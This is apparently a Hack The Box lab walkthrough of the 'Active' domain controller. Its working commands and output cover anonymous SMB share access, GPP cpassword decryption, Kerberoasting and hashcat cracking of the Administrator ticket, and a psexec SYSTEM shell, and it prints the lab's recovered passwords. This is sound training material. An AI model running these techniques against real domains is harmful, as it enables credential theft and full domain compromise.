## ENUMERATION

### NMAP

```bash
Nmap scan report for 10.10.10.100
Host is up (0.057s latency).
Not shown: 64674 closed tcp ports (reset), 839 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-17 15:34:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -23m19s
| smb2-time: 
|   date: 2025-07-17T15:35:20
|_  start_date: 2025-07-17T15:29:25
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 17 11:58:47 2025 -- 1 IP address (1 host up) scanned in 117.90 seconds
➜  active 

```

### SMB ENUMERATION

Checking for null sessions

```bash
nxc smb 10.10.10.100 -u '' -p '' 
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
```

ADDING DOMAIN TO HOST FILE

```bash
➜  active nxc smb 10.10.10.100 --generate-hosts-file /etc/hosts
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
➜  active cat /etc/hosts
10.10.11.219    pilgrimage.htb
10.10.11.28     sea.htb
10.10.11.20     editorial.htb
127.0.0.1       admin.sightless.htb
10.10.11.32     sightless.htb sqlpad.sightless.htb 
10.10.10.182    cascade.local
10.10.10.100     DC.active.htb active.htb DC
```

Since we can login as null sessions we will list shares or try to enumerate users

```bash
nxc smb 10.10.10.100 -u '' -p '' --shares            
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share
SMB         10.10.10.100    445    DC               Users                     
```

We can see we have READ permissions over the Replication share,

We will try to connect to the replication share using smbclient and download the files in the share.

```bash
smbclient //active.htb/Replication
Password for [WORKGROUP\root]:
Anonymous login successful                                                                   
Try "help" to get a list of possible commands.                                               
smb: \> recurse on
smb: \> prompt off 
smb: \> mget *                                                                               
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)                                                                      
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)                                                                      
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.3 KiloBytes/sec) (average 0.1 KiloBytes/sec)                                           
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (0.9 KiloBytes/sec) (average 0.7 KiloBytes/sec)                                          
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)         
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.1 KiloBytes/sec) (average 0.8 KiloBytes/sec)                                                                               
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (12.3 KiloBytes/sec) (average 1.4 KiloBytes/sec)
```

TREE VIEW OF THE FILE 

```bash
➜  active.htb tree
.
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts
```

### GPP PASSWORD DECRYPT

We can see we have a ton of file here but above all we can see the group..xml is a bit intresting 

```bash
cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

In the groups.xml we can see we have a encrypted password. We can google for the groups.xml password decrypt

<img width="722" height="571" alt="image" src="https://github.com/user-attachments/assets/935de965-dd54-4a66-86b1-b5e38d9e8ef1" />


We can see we have some results for decrypting this gpp(group policy preferences) file.

We can clone the gpp-decrypt repo from the first reslut and install and run it over our groups.xml file and get the password.

We also have a tool in the kali repo for decrypting gpp encrypted stings

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

Now we got our password. and potential username from the groups.xml ‘SVC_TGS’

```bash
nxc smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

## EXPLOITATION

Now lets connect to the user share with the credentials we got. and download the files listed in the share.

```bash
smbclient //10.10.10.100/Users -U SVC_TGS   
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on 
smb: \> mget * 
getting file \desktop.ini of size 174 as desktop.ini (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Administrator\*
NT_STATUS_STOPPED_ON_SYMLINK listing \All Users\*
getting file \Default\NTUSER.DAT of size 262144 as Default/NTUSER.DAT (125.1 KiloBytes/sec) (average 112.2 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG of size 1024 as Default/NTUSER.DAT.LOG (4.2 KiloBytes/sec) (average 102.1 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG1 of size 95232 as Default/NTUSER.DAT.LOG1 (165.8 KiloBytes/sec) (average 113.7 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG2 of size 0 as Default/NTUSER.DAT.LOG2 (0.0 KiloBytes/sec) (average 107.4 KiloBytes/sec)
getting file \Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf of size 65536 as Default/NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf (150.2 KiloBytes/sec) (average 112.4 KiloBytes/sec)
getting file \Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms of size 524288 as Default/NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms (329.0 KiloBytes/sec) (average 176.7 KiloBytes/sec)
getting file \Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms of size 524288 as Default/NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms (443.7 KiloBytes/sec) (average 224.9 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Default User\*
NT_STATUS_ACCESS_DENIED listing \Public\*
NT_STATUS_ACCESS_DENIED listing \Default\Application Data\*
NT_STATUS_ACCESS_DENIED listing \Default\Cookies\*
NT_STATUS_ACCESS_DENIED listing \Default\Local Settings\*
NT_STATUS_ACCESS_DENIED listing \Default\My Documents\*
NT_STATUS_ACCESS_DENIED listing \Default\NetHood\*
NT_STATUS_ACCESS_DENIED listing \Default\PrintHood\*
NT_STATUS_ACCESS_DENIED listing \Default\Recent\*
NT_STATUS_ACCESS_DENIED listing \Default\SendTo\*
NT_STATUS_ACCESS_DENIED listing \Default\Start Menu\*
NT_STATUS_ACCESS_DENIED listing \Default\Templates\*
getting file \SVC_TGS\Desktop\user.txt of size 34 as ***SVC_TGS/Desktop/user.txt*** (0.1 KiloBytes/sec) (average 217.0 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Default\Documents\My Music\*
NT_STATUS_ACCESS_DENIED listing \Default\Documents\My Pictures\*
NT_STATUS_ACCESS_DENIED listing \Default\Documents\My Videos\*
NT_STATUS_ACCESS_DENIED listing \Default\AppData\Local\Application Data\*
NT_STATUS_ACCESS_DENIED listing \Default\AppData\Local\History\*
NT_STATUS_ACCESS_DENIED listing \Default\AppData\Local\Temporary Internet Files\*
getting file \Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini of size 207 as Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini (0.8 KiloBytes/sec) (average 209.3 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Server Manager.lnk of size 1304 as Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Server Manager.lnk (5.4 KiloBytes/sec) (average 202.5 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Internet Explorer\Q
```

Here in the files we got our user flag

```bash
── Public
└── SVC_TGS
    ├── Contacts
    ├── Desktop
    │   └── user.txt
    ├── Downloads
    ├── Favorites
    ├── Links
    ├── My Documents
    ├── My Music
    ├── My Pictures
    ├── My Videos
    ├── Saved Games
    └── Searches
```

### GETTING DATA FOR BLOODHOUND

```bash
bloodhound-python -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -ns 10.10.10.100 -d active.htb  -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: active.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 5 users
INFO: Found 41 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
....
```

### BLOODHOUND

WE dont have much permissions with the user svc_tgs, after loading the data in bloodhound and listing all kerberoastable users we can see administrator.

<img width="1382" height="768" alt="image" src="https://github.com/user-attachments/assets/6a270b77-7df5-40cf-bae0-653d10c4844d" />

### KERBEROASTING ADMINISTRATOR

```bash
impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18 -request-user Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-07-17 11:30:35.187754             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5811b67fb13456282396bf3515c385e0$f23383fd1ad865a216cba5be4dd2382f844c08c0bf25d10c7da9bc73ecfa44d8e1991f03d40e669195c2ba88152ea6b14231f153a65eff8f5b1226db4ae7d1ff96df21af156a2d0316f5d5ef7bd3a83dc36c8db351785fefcb96f12a0fe81ecdb32e1c1dba42f45b26d2260ebf2598c277e5f46863876e14fe54865f30b77a8b12937d464e62fd8e0b316a3b1c5799a2bdd779b78de30f0d998e09f60e9e3d15871fe5843c22bfd81d60bf4ff2181b1bea8cbbcc0c3e6452eeeda208473a6e0693ec8c1f25450ed318bd784df2043eb5bffbe2a3315375a0fde38f62e5f22dfcc377b76696f00f68a146763ce26b5720b027b123ec3fd6bdb5e36a3db5475ec55253d6268e7401be43b908d3d98478cd477d53b642b3fb6f70ec99428114c1d176cf289ba67ff32223bc4ac224c9cc5d29b5f337f14ffb81de4fc616483a1b07a3b8754d6d5a2ffd6531d595326c22634aa16b57bc098492535528f0d35f2bb3189b4e59e2308bc6d9b96742b247ca9123b2a1b44349bf850aab1b5dc6c839e5ce5d84a68ed101a95abae4539455f2f74e4290228e9c82e5c231ddfb96b8ca3d7ba3acb4b2a22403b2d2961fea7add27b935158fb4b5637ae849332ecc6104f62dcb0d908514c50c1d52c4dbce018f64af85eb67de156056e10dcbf1c7a49d7628d6b42284c2326a18cc251f186c6a53d22dd1e3db0013dde8f154dc52f5c78f9f4beeac7a55b0b419ce92ddcf9d32cd7a4b3f3bdbd942bdbd54247e796f1dd721f6420284d5718e1bbc64ce11f0090e2e71383009118eb65995a84bfeb580ea088acacfc1e1ed08862fe8a49f7692e7725ba0b8600e743abe6e532687c8c3910be71d0efb529577bd1e38d58bf4dd5a9682f6557aace8d62cee8908c5dc1c3e0e39b875f90a7181289ef0984824e6791b7eae336f130a5b1c6f110f1b3694754fde4d3a6e577a13a4a30ca77747becfef5c1cc1683f2643967fc5c93e0e49fd9db728e1826d916e09251263a60c7aff632b5a174fdc22fe4fb869e3f7cdd4e5b715086d95e90fa541f0e9b5a84bc55b39740c6822064448a6e516529b96b8d18cd280126e7500b383af3637861b1c6c1b689125fbbde21d83541042cf60eb73519db000c023037a93b489f85c9ef96acdde9ed95b7473efdae9ce1f27d5724e448ac57f8a057717d6951715dcd26f75ae71f5557947b966a5bdbd28136a83393f04eb1c7349bbd4f538ebcb5bb7f9eda61163fc619ffe4f9e22
```

WE GOT THE KERBEROAST HASH AND NOW WE CAN CRACK THIS HASH

```bash
hashcat hash /home/panda/Downloads/rockyou.txt --show  
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5811b67fb13456282396bf3515c385e0$f23383fd1ad865a216cba5be4dd2382f844c08c0bf25d10c7da9bc73ecfa44d8e1991f03d40e669195c2ba88152ea6b14231f153a65eff8f5b1226db4ae7d1ff96df21af156a2d0316f5d5ef7bd3a83dc36c8db351785fefcb96f12a0fe81ecdb32e1c1dba42f45b26d2260ebf2598c277e5f46863876e14fe54865f30b77a8b12937d464e62fd8e0b316a3b1c5799a2bdd779b78de30f0d998e09f60e9e3d15871fe5843c22bfd81d60bf4ff2181b1bea8cbbcc0c3e6452eeeda208473a6e0693ec8c1f25450ed318bd784df2043eb5bffbe2a3315375a0fde38f62e5f22dfcc377b76696f00f68a146763ce26b5720b027b123ec3fd6bdb5e36a3db5475ec55253d6268e7401be43b908d3d98478cd477d53b642b3fb6f70ec99428114c1d176cf289ba67ff32223bc4ac224c9cc5d29b5f337f14ffb81de4fc616483a1b07a3b8754d6d5a2ffd6531d595326c22634aa16b57bc098492535528f0d35f2bb3189b4e59e2308bc6d9b96742b247ca9123b2a1b44349bf850aab1b5dc6c839e5ce5d84a68ed101a95abae4539455f2f74e4290228e9c82e5c231ddfb96b8ca3d7ba3acb4b2a22403b2d2961fea7add27b935158fb4b5637ae849332ecc6104f62dcb0d908514c50c1d52c4dbce018f64af85eb67de156056e10dcbf1c7a49d7628d6b42284c2326a18cc251f186c6a53d22dd1e3db0013dde8f154dc52f5c78f9f4beeac7a55b0b419ce92ddcf9d32cd7a4b3f3bdbd942bdbd54247e796f1dd721f6420284d5718e1bbc64ce11f0090e2e71383009118eb65995a84bfeb580ea088acacfc1e1ed08862fe8a49f7692e7725ba0b8600e743abe6e532687c8c3910be71d0efb529577bd1e38d58bf4dd5a9682f6557aace8d62cee8908c5dc1c3e0e39b875f90a7181289ef0984824e6791b7eae336f130a5b1c6f110f1b3694754fde4d3a6e577a13a4a30ca77747becfef5c1cc1683f2643967fc5c93e0e49fd9db728e1826d916e09251263a60c7aff632b5a174fdc22fe4fb869e3f7cdd4e5b715086d95e90fa541f0e9b5a84bc55b39740c6822064448a6e516529b96b8d18cd280126e7500b383af3637861b1c6c1b689125fbbde21d83541042cf60eb73519db000c023037a93b489f85c9ef96acdde9ed95b7473efdae9ce1f27d5724e448ac57f8a057717d6951715dcd26f75ae71f5557947b966a5bdbd28136a83393f04eb1c7349bbd4f538ebcb5bb7f9eda61163fc619ffe4f9e22:Ticketmaster1968
```

### SHELL AS ADMINISTRATOR

```bash
impacket-psexec administrator:Ticketmaster1968@10.10.10.100
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file JkjmUgpB.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service sVLk on 10.10.10.100.....
[*] Starting service sVLk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
